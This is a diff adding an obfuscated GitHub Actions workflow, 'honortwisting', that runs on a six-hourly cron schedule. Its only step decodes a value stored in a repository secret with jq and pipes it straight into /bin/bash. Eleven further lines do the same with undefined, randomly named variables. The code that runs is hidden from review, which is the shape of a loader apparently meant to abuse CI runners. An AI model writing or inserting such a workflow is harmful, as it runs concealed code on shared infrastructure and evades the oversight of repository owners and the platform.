@@ -1,0 +1,28 @@
+name: honortwisting
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: honortwisting
+        env:
+          ewhx85: ${{ secrets.ewhx85 }}
+        run: |
+          echo $ewhx85 | jq -r .cp46 | /bin/bash
+          echo $igy2223 | jq -r .ka55113 | /bin/bash
+          echo $jqqa5046 | jq -r .zui0 | /bin/bash
+          echo $kyj154 | jq -r .euyu4 | /bin/bash
+          echo $aeytb490 | jq -r .yemkm7496 | /bin/bash
+          echo $hn602 | jq -r .qovh70629 | /bin/bash
+          echo $p4422 | jq -r .xzev6 | /bin/bash
+          echo $ruc6 | jq -r .rjkfn9035 | /bin/bash
+          echo $zyhq181 | jq -r .j806 | /bin/bash
+          echo $kayfy670 | jq -r .gwdnj062 | /bin/bash
+          echo $nw17 | jq -r .cw277 | /bin/bash
+          echo $eizq42 | jq -r .lw331 | /bin/bash
+
